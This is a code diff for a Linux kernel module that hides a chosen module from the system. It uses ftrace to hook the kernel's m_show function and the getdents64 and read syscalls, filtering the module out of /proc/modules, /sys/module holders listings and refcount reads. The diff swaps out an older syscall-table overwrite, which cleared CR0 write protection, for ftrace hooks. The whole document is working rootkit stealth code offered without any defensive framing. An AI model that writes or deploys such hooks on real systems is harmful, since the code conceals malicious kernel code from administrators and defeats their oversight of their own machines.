@@ -9,46 +9,41 @@
 #include <linux/uaccess.h>
 #include <stdbool.h>
 
-// Function prototype
-void m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
-void module_refcount_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
+// Function prototype.
+void callback_func_base(struct pt_regs *regs, unsigned long parent_ip, unsigned long func_pointer);
 
-// Types & other consts.
 static char *mod_name_to_hide;
 module_param(mod_name_to_hide, charp, 0);
-
-static unsigned long *syscall_table; 
 static char *sys_modules_path = "/sys/module/";
-static char *module_name = "LsModIntercept";
 
-
+#pragma region hook_consts
 // get_dents64 hook
+void get_dents64_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
 typedef int (*original_getdents64_t)(const struct pt_regs *regs);
 static original_getdents64_t original_getdents64_ptr;
+static struct ftrace_ops get_dents64_ops = { .func = get_dents64_callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
 static char *holders_path = "/holders";
 
 // read hook
+void read_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
 typedef ssize_t  (*original_read_t)(const struct pt_regs *regs);
 static original_read_t original_read_ptr;
+static struct ftrace_ops read_ops = { .func = read_callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
 static char *refcount_path = "/refcnt";
 
 // m_show hook
+void m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
 typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
-static unsigned long m_show_address; 
 static original_m_show_t original_m_show_ptr;
 static struct ftrace_ops m_show_ops = { .func = m_show_callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
+#pragma endregion
 
-static inline void wp_cr0(unsigned long val) {
-    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
-}
-static inline void zero_cr0(void) {
-    printk(KERN_ALERT "Unprotecting mem!");
-    wp_cr0(read_cr0() & (~0x10000));
-}
-
-static inline void one_cr0(void) {
-    printk(KERN_ALERT "Protecting mem...");
-    wp_cr0(read_cr0() | 0x10000);
+#pragma region utils
+void notrace callback_func_base(struct pt_regs *regs, unsigned long parent_ip, unsigned long func_pointer)  {
+    // To prevent an infinite loop.
+    if (!within_module(parent_ip, THIS_MODULE)) {
+        regs->ip = func_pointer;
+    }
 }
 
 char* get_file_path_from_file_struct(struct file *file) {
@@ -73,7 +68,9 @@ int already_uses(struct module *a, struct module *b)
     
 	return 0;
 }
+#pragma endregion
 
+#pragma region read_hook
 ssize_t new_read(const struct pt_regs *regs) {
     int bytes_read = original_read_ptr(regs);
     struct file *file = fget((int)regs->di);
@@ -96,7 +93,7 @@ ssize_t new_read(const struct pt_regs *regs) {
 
         int does_use_hidden_module = already_uses(module_to_hide, current_module);
         if (does_use_hidden_module) {
-            printk("Removing from used by...");
+            printk(KERN_ALERT "Hiding %s from %s's refcount...", module_to_hide->name, current_module->name);
 
             int refcount = module_refcount(current_module);
             if (refcount > 0) {
@@ -116,6 +113,12 @@ ssize_t new_read(const struct pt_regs *regs) {
     return bytes_read;
 }
 
+void notrace read_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
+    callback_func_base(regs, parent_ip, (unsigned long)new_read);
+}
+#pragma endregion
+
+#pragma region get_dents64_hook
 int new_getdents64(const struct pt_regs *regs) {
     int total_bytes_read = original_getdents64_ptr(regs);
     void *buff_pointer = (void*)regs->si;
@@ -141,7 +144,7 @@ int new_getdents64(const struct pt_regs *regs) {
             struct file *file = fget((int)regs->di);
             char *path = get_file_path_from_file_struct(file);
             if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, holders_path) != NULL) && (!strcmp(curr->d_name, mod_name_to_hide))) {
-                printk(KERN_ALERT "Hiding %s from %s", mod_name_to_hide, path);    
+                printk(KERN_ALERT "Hiding %s from %s using get_dents64", mod_name_to_hide, path);    
                 has_been_found = true;
                 int length_to_copy = total_bytes_read - i - curr->d_reclen;
 
@@ -164,10 +167,16 @@ int new_getdents64(const struct pt_regs *regs) {
     return total_bytes_read;
 }
 
+void notrace get_dents64_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
+    callback_func_base(regs, parent_ip, (unsigned long)new_getdents64);
+}
+#pragma endregion
+
+#pragma region m_show_hook
 int new_m_show(struct seq_file *m, void *p) {
     struct module *mod = list_entry(p, struct module, list);
     if (!strcmp(mod->name, mod_name_to_hide)) {
-        printk(KERN_ALERT "Hiding %s", mod->name);
+        printk(KERN_ALERT "Hiding %s from m_show", mod->name);
         return 0;
     }
 
@@ -175,12 +184,10 @@ int new_m_show(struct seq_file *m, void *p) {
 }
 
 void notrace m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
-    // To prevent an infinite loop.
-    if (!within_module(parent_ip, THIS_MODULE)) {
-        regs->ip = (long unsigned int)new_m_show;
-    }
+    callback_func_base(regs, parent_ip, (unsigned long)new_m_show);
 }
- 
+#pragma endregion
+
 int load(void) {
     if (mod_name_to_hide == NULL) {
         printk("Mod name to hide has not been set! Exiting...");
@@ -188,26 +195,30 @@ int load(void) {
     }
 
     printk(KERN_ALERT "Initializing...");
-    m_show_address = kallsyms_lookup_name("m_show");
+    unsigned long m_show_address = kallsyms_lookup_name("m_show");
     if (!m_show_address) {
         printk(KERN_ALERT "Failed to find m_show!");            
         return 0;
     }
-    printk(KERN_ALERT "m_show found %lu", m_show_address);
+
     original_m_show_ptr = (original_m_show_t)m_show_address;
     ftrace_set_filter_ip(&m_show_ops, (unsigned long)original_m_show_ptr, 0, 0);
     register_ftrace_function(&m_show_ops);
 
-    zero_cr0();
-    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+    unsigned long *syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+    if (!syscall_table) {
+        printk(KERN_ALERT "Failed to find syscall table!");            
+        return 0;
+    }
+
     original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
-    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
-    printk(KERN_ALERT "Overrided getdents64 ptr!");
+    ftrace_set_filter_ip(&get_dents64_ops, (unsigned long)original_getdents64_ptr, 0, 0);
+    register_ftrace_function(&get_dents64_ops);
 
     original_read_ptr = (original_read_t)syscall_table[__NR_read];
-    syscall_table[__NR_read] = (unsigned long)new_read;
-    printk(KERN_ALERT "Overrided read ptr!");
-    one_cr0();
+    ftrace_set_filter_ip(&read_ops, (unsigned long)original_read_ptr, 0, 0);
+    register_ftrace_function(&read_ops);
+
     printk(KERN_ALERT "Initialized successfuly!");
 
     return 0;
@@ -215,15 +226,11 @@ int load(void) {
  
 void unload(void) {
     printk(KERN_ALERT "Shutting down.");
+
     unregister_ftrace_function(&m_show_ops);
+    unregister_ftrace_function(&get_dents64_ops);
+    unregister_ftrace_function(&read_ops);
 
-    zero_cr0();
-    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
-    printk(KERN_ALERT "getdents64 has been restored!");
-
-    syscall_table[__NR_read] = (unsigned long)original_read_ptr;
-    printk(KERN_ALERT "read has been restored!");
-    one_cr0();
     printk(KERN_ALERT "Goodbye world...");
 }
 
